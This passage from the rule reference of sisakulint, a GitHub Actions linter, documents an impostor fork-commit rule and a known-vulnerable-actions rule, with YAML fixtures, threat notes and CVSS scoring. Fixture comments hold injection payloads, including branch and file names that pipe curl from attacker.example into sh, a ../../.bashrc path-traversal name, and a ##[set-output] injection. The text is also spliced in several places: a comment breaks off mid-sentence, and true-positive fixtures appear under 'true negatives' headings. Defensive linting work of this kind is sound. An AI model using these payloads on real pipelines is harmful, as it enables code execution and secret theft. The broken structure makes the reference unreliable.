        build:
          runs-on: ubuntu-latest
          steps:
            - run: echo built
        disabled:
          if: false
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@70379aad1a8b40919ce8b382d3cd7d0315cde1d0
        on-failure:
          needs: build
          if: needs.build.result == 'failure'
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@70379aad1a8b40919ce8b382d3cd7d0315cde1d0
      ```
    - fork-commit.yml (workflow, true-negative)
      ```yaml
      # situation: the step uses actions/checkout by the tag v4.
      # reason: GitHub serves a fork's commit under the repository's name only by
      #   its SHA; a tag is looked up among actions/checkout's own tags, so v4
      #   cannot name a commit only a fork has (commit-sha reports the tag: the
      #   undetected form not-sha of this rule declares the form as other-rule).
      # attack: someone pushes a commit to their fork of actions/checkout.
      # attack-run-behavior: the runner looks up v4 among actions/checkout's own
      #   tags and runs 11d5960a, the commit v4 names; no tag of actions/checkout
      #   names the fork's commit, so the step does not run it.
      on: push
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
      ```

### undetected forms

- reusable-workflow: a job's uses (a reusable workflow): GitHub refuses one whose commit no branch or tag of the repository has, so the run never starts
  - finding kinds: impostor-commit.fork-commit
  - disposition: no-added-gain
  - example: reusable-workflow.yml (workflow, undetected)
    ```yaml
    # situation: on push, a job calls a reusable workflow of another repository
    #   pinned to a full SHA.
    # reason: no added gain: GitHub refuses a reusable workflow whose commit no
    #   branch or tag of the repository has: the run never starts.
    # cause: the rule reads the uses of steps only.
    # attack: someone pushes a commit to their fork of owner/repo and gets its
    #   SHA, b3154b95, written as the job's uses.
    # attack-run-behavior: GitHub refuses a reusable workflow whose commit no
    #   branch or tag of owner/repo has, and fails the whole run before any job
    #   starts, so the fork's workflow does not run.
    on: push
    jobs:
      call:
        uses: owner/repo/.github/workflows/r.yml@b3154b9543ce6392fe65a19ce523c4d4adabca7b
    ```
- sha256: a ref of 64 hexadecimal digits (a SHA-256 repository): commit-sha reports it as not pinned
  - finding kinds: impostor-commit.fork-commit
  - disposition: other-rule (rule: commit-sha)
  - example: sha256.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step uses an action by a ref of 64 hexadecimal
    #   digits.
    # reason: another rule's: 64 hexadecimal digits (a SHA-256 repository) are
    #   not a full SHA here; commit-sha reports the ref as not pinned.
    # cause: the rule reads a ref of 40 hexadecimal digits as a full SHA.
    # attack: with owner/repo a SHA-256 repository, someone pushes a commit to
    #   their fork of it and gets its SHA of 64 hexadecimal digits written as
    #   the ref.
    # attack-run-behavior: if GitHub serves a fork's commit by the repository's
    #   name in a SHA-256 repository as it does in a SHA-1 one, the runner
    #   fetches that commit by the name owner/repo and runs its action as the
    #   step; this was not tried, and GitHub refuses to create a branch or a tag
    #   of 64 hexadecimal digits, so the ref is not a tag that can be moved.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: owner/repo@0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
    ```
- not-sha: a ref that is not a full SHA (a tag, a branch, a shortened SHA): commit-sha reports it
  - finding kinds: impostor-commit.fork-commit
  - disposition: other-rule (rule: commit-sha)
  - example: not-sha.yml (workflow, undetected)
    ```yaml
    # situation: on push, steps use actions/checkout by a tag, a branch and a
    #   shortened SHA.
    # reason: another rule's: commit-sha reports a ref that is not a full SHA.
    # cause: the two rules share the steps' remote uses by whether the ref is a
    #   full SHA, and this rule reads full SHAs.
    # attack: the owner of actions/checkout moves the tag v4 and the branch main
    #   to commits of theirs.
    # attack-run-behavior: the runner resolves @v4 and @main when the job runs
    #   and runs the commits they now name as the first two steps; it refuses
    #   @11bd719 as a shortened SHA, and whether it would read a tag named
    #   11bd719 instead was not tried.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: actions/checkout@main
          - uses: actions/checkout@11bd719
    ```
- remote-callee: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/&lt;file>@&lt;ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form
  - finding kinds: impostor-commit.fork-commit
  - disposition: todo (needs: fact)
  - example: remote-callee.yml (workflow, undetected)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/impostor-commit-unanswered, whose content is
    #   the workflow of the true positive fork-commit (fork-commit.yml) of the
    #   rule, with on: workflow_call in place of the on of fork-commit.yml. The
    #   linter has no answer of the fact workflow.definition for the reusable
    #   workflow.
    # reason: a todo (a fact): the jobs of a reusable workflow run on the event
    #   that started the run of the calling job, and the linter does not read
    #   the reusable workflow.
    # cause: the rule reads a reusable workflow of another repository only from
    #   the answer of workflow.definition.
    # attack: the rule reports the form in which someone pushes a commit to
    #   their fork of actions/checkout and gets its SHA written in this
    #   workflow, such as by a pull request from a fork that changes the SHA of
    #   the uses and is merged. Background: in the Trivy incident of 2026-03-19,
    #   a commit pushed with stolen credentials swapped the workflow's
    #   actions/checkout for the impostor commit 70379aad; the credential
    #   premise leaves the holder of such stolen credentials out of the threat
    #   model, but the workflow that the incident left has the same form.
    # attack-run-behavior: the runner fetches 70379aad by the name
    #   actions/checkout, from the objects the fork network shares, and runs its
    #   action as the step, in the job's workspace and environment; in the Trivy
    #   incident it was a composite action that downloaded malicious Go source
    #   files from a typosquatted domain, and the commit was tagged v0.69.4 so
    #   that the release pipeline ran it.
    on: push
    permissions: {}
    jobs:
      c:
        uses: example-org/impostor-commit-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### inconclusive

- remote-callee-unknown: a job that calls a reusable workflow of another repository, when the linter asked the fact workflow.definition for the reusable workflow and got no answer (the token that the linter uses cannot read the file, the file is larger than the limit, or the linter has used up the requests it may send to the GitHub API), or when the call is deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact: the rule does not read the jobs and the steps of the reusable workflow
  - disposition: todo (needs: fact)
  - example: remote-callee-unknown.yml (workflow, inconclusive)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/impostor-commit-unknown, whose content is the
    #   workflow of the true positive fork-commit (fork-commit.yml) of the rule,
    #   with on: workflow_call in place of the on of fork-commit.yml. The linter
    #   asked the fact workflow.definition for the reusable workflow and got no
    #   answer.
    # reason: what the jobs of the reusable workflow do is in the file that the
    #   linter could not read; whoever changes the uses, such as the author of a
    #   pull request, can name a reusable workflow that the token that the
    #   linter uses cannot read.
    # attack: the rule reports the form in which someone pushes a commit to
    #   their fork of actions/checkout and gets its SHA written in this
    #   workflow, such as by a pull request from a fork that changes the SHA of
    #   the uses and is merged. Background: in the Trivy incident of 2026-03-19,
    #   a commit pushed with stolen credentials swapped the workflow's
    #   actions/checkout for the impostor commit 70379aad; the credential
    #   premise leaves the holder of such stolen credentials out of the threat
    #   model, but the workflow that the incident left has the same form.
    # attack-run-behavior: the runner fetches 70379aad by the name
    #   actions/checkout, from the objects the fork network shares, and runs its
    #   action as the step, in the job's workspace and environment; in the Trivy
    #   incident it was a composite action that downloaded malicious Go source
    #   files from a typosquatted domain, and the commit was tagged v0.69.4 so
    #   that the release pipeline ran it.
    on: push
    permissions: {}
    jobs:
      c:
        uses: example-org/impostor-commit-unknown/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### false positive forms

- actions-not-allowed: a workflow whose run GitHub does not start, or a job that GitHub fails in the step "Set up job", because of the setting of allowed actions of GitHub (the fact repo.allowed-actions, which the quality rule allowed-actions reads): GitHub does not start a run of a workflow that has a uses, or that calls a reusable workflow that has a uses, that the setting does not allow, and fails a job before any step of the job runs when a step of a composite action that the job runs has a uses that the setting does not allow, or when the setting requires a full commit SHA and a step names an action by a tag or a branch. The harm that the finding reports happens only when GitHub runs the workflow or the job, and the rule does not read repo.allowed-actions
  - finding kinds: impostor-commit.fork-commit
  - disposition: todo (needs: fact)
  - example: actions-not-allowed.yml (workflow, false-positive)
    ```yaml
    # situation: the workflow of the true positive fork-commit (fork-commit.yml)
    #   of the rule, with a job added whose step uses
    #   example-org/not-allowed-action, which the setting of allowed actions of
    #   GitHub (repo.allowed-actions) blocks with
    #   !example-org/not-allowed-action@*. In the true positive, a step uses
    #   actions/checkout by a commit SHA that only a fork of actions/checkout
    #   has.
    # reason: GitHub checks each uses of the workflow before the run starts, and
    #   does not start the run because of the uses of
    #   example-org/not-allowed-action: no job of the run runs, so what the
    #   reason of the true positive says does not happen (in runs that the
    #   authors of the rule made on GitHub, such runs ended as startup_failure).
    # cause: the rule does not read repo.allowed-actions.
    # attack: the rule reports the form in which someone pushes a commit to
    #   their fork of actions/checkout and gets its SHA written in this
    #   workflow, such as by a pull request from a fork that changes the SHA of
    #   the uses and is merged. Background: in the Trivy incident of 2026-03-19,
    #   a commit pushed with stolen credentials swapped the workflow's
    #   actions/checkout for the impostor commit 70379aad; the credential
    #   premise leaves the holder of such stolen credentials out of the threat
    #   model, but the workflow that the incident left has the same form.
    # attack-run-behavior: GitHub does not start the run, so no step of the run
    #   runs, and the attack does nothing.
    on: push
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@70379aad1a8b40919ce8b382d3cd7d0315cde1d0
      not-allowed:
        runs-on: ubuntu-latest
        steps:
          - uses: example-org/not-allowed-action@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### threat

- precondition fork-commit-runs: a commit only in a fork is fetched and run by the repository's name
  - observed: 2026-09-25, runner 2.337.0: a step's uses, and one in a composite action, ran a commit pushed only to a fork, the head of a pull request from a fork, and a commit left by a deleted branch, all by the name of the repository forked
  - observed: 2026-10-14, runner 2.337.0: a step's uses of a commit only in a fork, by its SHA, ran it with the workflow onboarded to the repository's workflow dependency lockfile (.github/workflows/actions.lock) and the lockfile recording that SHA as both its ref and its commit
  - cites:
    - <https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd>
- precondition caller-writes-sha: the caller writes that SHA, which looks like any other: a change that pins actions to SHAs, with one of them a fork's, is merged
  - cites:
    - <https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd>
    - <https://docs.github.com/en/actions/reference/security/secure-use#using-third-party-actions>
- precondition not-reusable: not a reusable workflow: GitHub refuses one whose commit no branch or tag of the repository has
  - observed: 2026-09-25: a reusable workflow pinned to a commit of a fork, of a pull request's head, of a deleted branch or to a tag object failed the whole run; one pinned under a branch or at a tag ran
- actor: forker-of-called
  - via: pushes a commit to a fork, and has its SHA written in a change the caller merges
  - gains: run-code, read-secrets, write-with-token, write-cache
- incident trivy-2026: 2026-03-19, CVE-2026-33634: with stolen credentials, a commit swapped the actions/checkout of a workflow for an impostor commit (70379aad) that fetched malicious code, and was tagged v0.69.4 to run the release; 76 of the 77 version tags of aquasecurity/trivy-action and all 7 of aquasecurity/setup-trivy were force-pushed to credential-stealing commits
  - advisory: <https://github.com/advisories/GHSA-69fq-xp46-6x23>
  - compromised: aquasecurity/trivy, aquasecurity/trivy-action, aquasecurity/setup-trivy

### CVSS

#### impostor-commit.fork-commit

- vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:L/SC:H/SI:H/SA:N/E:A
- CVSS-B: 9.3 (critical)
- CVSS-BT: 9.3 (critical)
- impact: H (from VC, VI, SC, SI)
- likelihood: medium (from AV:N, AT:N, PR:N; lowered by UI:A)
- severity: high (impact H, likelihood medium; the table: sisakulint --explain=terms)
- AV: N
  - reason: the attacker pushes to a fork, over the network
  - cites: none
- AC: L
  - reason: a fork and a push are all it takes
  - cites: none
- AT: N
  - reason: anyone can fork a public repository; nothing of the repository called is needed
  - cites: none
- PR: N
  - reason: nothing of the calling repository is needed
  - cites: none
- UI: A
  - reason: someone of the calling repository merges the change that writes the SHA
  - cites:
    - <https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd>
- VC: H
  - reason: the code reads the job's secrets and GITHUB_TOKEN
  - cites: none
- VI: H
  - reason: with the job's token the code can push, and write releases, artifacts and caches; in the Trivy incident the impostor put malicious code in a release
  - cites:
    - <https://github.com/advisories/GHSA-69fq-xp46-6x23>
- VA: L
  - reason: the code can fail or stop the job
  - cites: none
- SC: H
  - reason: the secrets open what is past the job: clouds, registries, other repositories
  - cites: none
- SI: H
  - reason: what the job publishes (releases, packages) reaches those who use it
  - cites: none
- SA: N
  - reason: nothing past the job is made unavailable by this as such
  - cites: none
- E: A
  - reason: in the Trivy incident of 2026-03 the attacker swapped actions/checkout for an impostor commit in a workflow; CISA lists it in its Known Exploited Vulnerabilities
  - cites:
    - <https://github.com/advisories/GHSA-69fq-xp46-6x23>
    - <https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-33634>

## known-vulnerable-actions

- problem: a uses of another repository runs a version that an advisory of the GitHub Advisory Database says is vulnerable
- expected: every uses runs a version no advisory names, or one the advisories say is fixed
- severity: critical (the worst of its kinds)
- targets: workflow, action-metadata
- facets:
  - weakness: untrusted-reference
  - attack-means: string, code, operation
- default run: facts: the rule runs, with all its kinds of findings (also those that need no fact), when --rule names the rule; in a run without --rule, the rule runs when --online is given, or when --facts or --fact gives a found or absent answer to any fact of package.advisories

### finding kinds

- known-vulnerable-actions.advisory-critical
  - detected: {uses} runs {version} of {package}, which {ghsa_id} (rated critical by GitHub) says is vulnerable ({vulnerable_version_range})
  - arguments:
    - {uses}: The uses, as written.
    - {version}: A version of a package in the form that the GitHub Advisory Database compares: an optional v, numbers of at most 9 digits joined by dots, and a prerelease after a hyphen, such as v4.1.2, 4 or 2.0.0-beta.1. A version tag of an action has the same form.
    - {package}: The name of a package of the actions ecosystem of the GitHub Advisory Database: owner/repo of an action or a reusable workflow, and the path to the action or the workflow in the repository when the action or the workflow is not at the root. GitHub compares owner and repo without case; sisakulint writes owner and repo in lower case, and the path as written.
    - {ghsa_id}: The ID of an advisory of the GitHub Advisory Database, GHSA-xxxx-xxxx-xxxx.
    - {vulnerable_version_range}: The range of versions the advisory says the vulnerability affects, as GitHub writes the range.
  - consequence: an attacker may use the vulnerability the advisory describes; GitHub's rating of the advisory is its own, and the severity of this finding is found by another table
  - remedy: upgrade to a version the advisory says is fixed, or stop using the action
  - severity: critical (found from the CVSS metrics below by the table)
  - fix kinds: upgrade-version
  - attackers: advisory-attacker
  - preconditions: affects-version, tag-runs
  - incidents: trivy-2026
  - true positives:
    - advisory-critical.ghsa-2qvg-qr73-mqxp.yml (workflow, true-positive)
      ```yaml
      # situation: on pull_request_target, a step uses wktk/conflibot pinned to the
      #   commit of v1.2.0, and a step on push uses
      #   BoldestDungeon/steam-workshop-deploy pinned to the commit of v1.0.1 after
      #   actions/checkout. The advisories name no workflow; the steps that use the
      #   actions follow the configurations that the advisories describe:
      #   GHSA-2qvg-qr73-mqxp, "The recommended workflow runs conflibot on the
      #   `pull_request_target` event", and GHSA-x6gv-2rvh-qmp6, a checkout with
      #   actions/checkout whose credential is a personal access token, which does not
      #   expire when the job ends.
      # reason: GHSA-2qvg-qr73-mqxp, which GitHub rates critical, says the code of
      #   conflibot before 1.2.1 builds git commands with the names of the branches of
      #   pull requests and runs them through a shell; GHSA-x6gv-2rvh-qmp6, which
      #   GitHub rates critical, says steam-workshop-deploy before 2.0.0 puts the .git
      #   directory, with the credential in .git/config, in the item it publishes.
      #   Both are in the code of the action, which the workflow does not show.
      # attack: the author of a pull request from a fork names the head branch of
      #   the pull request a$(curl${IFS}-sSf${IFS}https://attacker.example/x|sh) and
      #   opens the pull request (the job conflict); one who subscribes to the item of
      #   the Steam Workshop downloads the item (the job deploy).
      # attack-run-behavior: conflibot v1.2.0 runs a git command with the name of
      #   the branch through a shell, which runs the command substitution with the
      #   write token of pull_request_target; steam-workshop-deploy v1.0.1 publishes
      #   .git/config with the personal access token of the checkout.
      # advisory: https://github.com/advisories/GHSA-2qvg-qr73-mqxp
      # advisory: https://github.com/advisories/GHSA-x6gv-2rvh-qmp6
      on:
        pull_request_target:
        push:
      jobs:
        conflict:
          if: github.event_name == 'pull_request_target'
          runs-on: ubuntu-latest
          steps:
            - uses: wktk/conflibot@4881912dc3fe459059127d667251d5b324622299 # v1.2.0
              with:
                github-token: ${{ secrets.GITHUB_TOKEN }}
        deploy:
          if: github.event_name == 'push'
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
              with:
                token: ${{ secrets.MOD_REPOSITORY_TOKEN }}
            - uses: BoldestDungeon/steam-workshop-deploy@a6e5b5fa5963fb5b9e22c7e0dfa046a1481c4974 # v1.0.1
              with:
                username: ${{ secrets.STEAM_USERNAME }}
                configVdf: ${{ secrets.STEAM_CONFIG_VDF }}
                appId: 763890
                publishedFileId: 1234567890
      ```
    - advisory-critical.no-caller.action.yml (action-metadata, true-positive)
      ```yaml
      # situation: a composite action with no caller among the files that the
      #   linter reads; a step reads the branch names with tj-actions/branch-names
      #   pinned to the commit of v7.0.6.
      # reason: GHSA-8v8w-v8xg-79rf and GHSA-gq52-6phf-x2r6, which GitHub rates
      #   critical, say tj-actions/branch-names runs a branch name as code: the head
      #   ref in a run step, and the escaped name unescaped again by eval printf.
      # attack-value: the name of the branch of the pull request = "a$(echo${IFS}PWNED)"
      # attack-run-behavior: when a workflow that calls the action runs on
      #   pull_request_target, the script of tj-actions/branch-names runs the
      #   command in the branch name, with the token and the secrets of the job of
      #   the base repository.
      name: branch names
      description: read the branch names
      runs:
        using: composite
        steps:
          - uses: tj-actions/branch-names@ab304d8562e2f137165e1d930e6d22d431189074 # v7.0.6
      ```
    - advisory-critical.remote-callee.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls the reusable workflow .github/workflows/w.yml of
      #   the repository example-org/known-vulnerable-actions-remote, which the
      #   fact workflow.definition answers with the workflow of the true positive
      #   advisory-critical (advisory-critical.yml) of the rule, with on:
      #   workflow_call in place of the on of advisory-critical.yml. The job
      #   passes its secrets with secrets: inherit. In the true positive, on
      #   pull_request_target, a step reads the branch names with
      #   tj-actions/branch-names pinned to the commit of v7.0.6.
      # reason: the jobs of a reusable workflow run on the event that started the
      #   run of the calling job, so the reason of the true positive holds:
      #   GHSA-8v8w-v8xg-79rf and GHSA-gq52-6phf-x2r6, which GitHub rates
      #   critical, say that a branch name runs as code: GHSA-8v8w-v8xg-79rf, the
      #   head ref in a run step of the action; GHSA-gq52-6phf-x2r6, the name that
      #   the action escapes and unescapes again by eval printf and writes to its
      #   outputs, which a run step of the caller runs (the example
      #   step-output-remote-action.ghsl-2025-087 of code-injection has that
      #   form).
      # attack-value: the name of the pull request's branch = "a$(echo${IFS}PWNED)"
      # attack-run-behavior: the action's script runs the command in the branch
      #   name, with the token and the secrets of the job of the base repository.
      on: pull_request_target
      jobs:
        c:
          uses: example-org/known-vulnerable-actions-remote/.github/workflows/w.yml@v1
          secrets: inherit
      ```
    - advisory-critical.yml (workflow, true-positive)
      ```yaml
      # situation: on pull_request_target, a step reads the branch names with
      #   tj-actions/branch-names pinned to the commit of v7.0.6.
      # reason: GHSA-8v8w-v8xg-79rf and GHSA-gq52-6phf-x2r6, which GitHub rates

      # attack-value: the name of the pull request's branch = "a$(echo${IFS}PWNED)"
      # attack-run-behavior: the action's script runs the command in the branch
      #   name, with the token and the secrets of the job of the base repository.
      # advisory: https://github.com/advisories/GHSA-gq52-6phf-x2r6
      on: pull_request_target
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - uses: tj-actions/branch-names@ab304d8562e2f137165e1d930e6d22d431189074 # v7.0.6
      ```
  - true negatives:

GitHub compares owner and repo without case; sisakulint writes owner and repo in lower case, and the path as written.

  - true positives:
    - advisory-high.ghsa-cxww-7g56-2vh6.yml (workflow, true-positive)
      ```yaml
      # situation: on workflow_run, a job downloads the artifact of the run that
      #   triggered it with actions/download-artifact pinned to the commit of
      #   v4.1.2. The advisory names no workflow; the step follows what the advisory
      #   describes: GHSA-cxww-7g56-2vh6 says that versions before 4.1.3 "are
      #   vulnerable to arbitrary file write when downloading and extracting a
      #   specifically crafted artifact that contains path traversal filenames".
      # reason: GHSA-cxww-7g56-2vh6, which GitHub rates high, is in the code of the
      #   action, which the workflow does not show: the action writes a file of the
      #   artifact outside the directory of the download when the name of the file
      #   holds ../.
      # attack: the author of a pull request from a fork makes the run of the pull
      #   request upload an artifact with a file named ../../.bashrc.
      # attack-run-behavior: actions/download-artifact v4.1.2 extracts the file
      #   outside the directory of the download, over a file that a later step of
      #   the job reads, with the token of the job of the base repository.
      # advisory: https://github.com/advisories/GHSA-cxww-7g56-2vh6
      on:
        workflow_run:
          workflows: [ci]
          types: [completed]
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/download-artifact@eaceaf801fd36c7dee90939fad912460b18a1ffe # v4.1.2
              with:
                run-id: ${{ github.event.workflow_run.id }}
                github-token: ${{ secrets.GITHUB_TOKEN }}
      ```
    - advisory-high.ghsa-r79c-pqj3-577x.yml (workflow, true-positive)
      ```yaml
      # situation: on pull_request_target, a job checks out the head of the pull
      #   request with actions/checkout v4.2.2 and runs super-linter/super-linter
      #   pinned to the commit of v8.3.0 over the checkout, and a job on a Windows
      #   runner uses SonarSource/sonarqube-scan-action pinned to the commit of v5.3.1
      #   with the title of the pull request in its input args. The advisories name no
      #   workflow; the steps that use the actions follow the configurations that the
      #   advisories describe: GHSA-r79c-pqj3-577x, an attacker who can "run workflows
      #   without any approval" on a pull request that adds a file, and
      #   GHSA-5xq9-5g24-4g6f, "when workflows pass user-controlled input to the args
      #   parameter on Windows runners". On pull_request, the author of a pull request
      #   from a fork can change the workflow and gets a GITHUB_TOKEN with read access
      #   only, so the example runs on pull_request_target, where the job has the
      #   token and the secrets of the base repository.
      # reason: GHSA-r79c-pqj3-577x, which GitHub rates high, says the scripts of
      #   super-linter from 6.0.0 to before 8.3.1 run a command written in the name of
      #   a file that a pull request adds; GHSA-5xq9-5g24-4g6f, which GitHub rates
      #   high, says sonarqube-scan-action from 4.0.0 to before 6.0.0 runs a command
      #   written in args on Windows. Both are in the code of the action, which the
      #   workflow does not show.
      # attack: the author of a pull request from a fork adds a file named
      #   $(curl${IFS}-sSf${IFS}https://attacker.example/x|sh).md, and writes a title
      #   that closes the quoting of args on Windows.
      # attack-run-behavior: super-linter v8.3.0 runs the command substitution in
      #   the name of the file while super-linter lists the changed files, and
      #   sonarqube-scan-action v5.3.1 runs the command in args, each with the token
      #   and the secrets of the job of the base repository.
      # advisory: https://github.com/advisories/GHSA-r79c-pqj3-577x
      # advisory: https://github.com/advisories/GHSA-5xq9-5g24-4g6f
      on: pull_request_target
      jobs:
        lint:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
              with:
                ref: ${{ github.event.pull_request.head.sha }}
            - uses: super-linter/super-linter@502f4fe48a81a392756e173e39a861f8c8efe056 # v8.3.0
              env:
                GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        sonar:
          runs-on: windows-latest
          steps:
            - uses: SonarSource/sonarqube-scan-action@1a6d90ebcb0e6a6b1d87e37ba693fe453195ae25 # v5.3.1
              with:
                args: -Dsonar.projectName="${{ github.event.pull_request.title }}"
      ```
    - advisory-high.yml (workflow, true-positive)
      ```yaml
      # situation: a step downloads an artifact with actions/download-artifact
      #   pinned to the commit of v4.1.2.
      # reason: GHSA-cxww-7g56-2vh6, which GitHub rates high, says the versions
      #   before 4.1.3 write the files of a crafted artifact outside the path, by
      #   path traversal file names.
      # attack: someone who makes the artifact this step downloads (the run of a
      #   pull request, for one) puts in it a file whose name climbs out of the
      #   path.
      # attack-run-behavior: v4.1.2 writes that file where its name points, over
      #   a file of the workspace or of the runner that a later step runs.
      on: push
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/download-artifact@eaceaf801fd36c7dee90939fad912460b18a1ffe # v4.1.2
      ```
  - true negatives:

    - advisory-medium.ghsa-6f4g-xm8v-pgv6.yml (workflow, true-positive)
      ```yaml
      # situation: on pull_request_target, a job checks out the head of the pull
      #   request with actions/checkout v4.2.2 and runs tmatens/compose-lint pinned
      #   to the commit of v0.30.0, in a step with the id lint, over the Compose file
      #   of the checkout. The advisory names no workflow; the step follows the
      #   configuration that GHSA-6f4g-xm8v-pgv6 describes: "Inside the compose-lint
      #   Action, a Compose file from a pull request" sets the text of the report. On
      #   pull_request, the author of a pull request from a fork can change the
      #   workflow and gets a GITHUB_TOKEN with read access only, so the example runs
      #   on pull_request_target. The rule also reports four advisories that GitHub
      #   rates low on the same step (GHSA-88f4-frh5-gmcr, GHSA-jf3h-8jvx-vcrg,
      #   GHSA-xcf7-88g6-7xr8 and GHSA-6wcv-rj3c-mhv3), whose example is
      #   advisory-low.ghsa-xcf7-88g6-7xr8. The fix of the rule upgrades the step
      #   to the commit of v0.33.0: the greatest first patched version of the five
      #   advisories is 0.32.0, which is in the range of GHSA-rm8w-w798-g545, so
      #   the fix moves on to the first patched version of GHSA-rm8w-w798-g545,
      #   0.33.0, which is in the range of no advisory of the package.
      # reason: GHSA-6f4g-xm8v-pgv6, which GitHub rates medium, says the text report
      #   of compose-lint up to 0.30.0 prints service names, environment keys and
      #   lines of the Compose file without neutralizing ##[, and that the Action
      #   up to 0.30.0 prints the report with the processing of workflow commands
      #   on. The code of the action, which the workflow does not show, prints the
      #   report.
      # attack: the author of a pull request from a fork names a service of the
      #   Compose file ##[set-output name=sarif-written;]true.
      # attack-run-behavior: the runner reads the line of the report that holds the
      #   name of the service as a set-output command, and sets the output
      #   sarif-written of the step of the action that runs compose-lint, which the
      #   action passes on as the output sarif-written of the step lint.
      # advisory: https://github.com/advisories/GHSA-6f4g-xm8v-pgv6
      on: pull_request_target
      jobs:
        lint:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
              with:
                ref: ${{ github.event.pull_request.head.sha }}
            - id: lint
              uses: tmatens/compose-lint@adf00708734b772686337b69831c8e3912fa0ed4 # v0.30.0
      ```

- known-vulnerable-actions.advisory-low
  - detected: {uses} runs {version} of {package}, which {ghsa_id} (rated low by GitHub) says is vulnerable ({vulnerable_version_range})
  - arguments:
    - {uses}: The uses, as written.
    - {version}: A version of a package in the form that the GitHub Advisory Database compares: an optional v, numbers of at most 9 digits joined by dots, and a prerelease after a hyphen, such as v4.1.2, 4 or 2.0.0-beta.1. A version tag of an action has the same form.
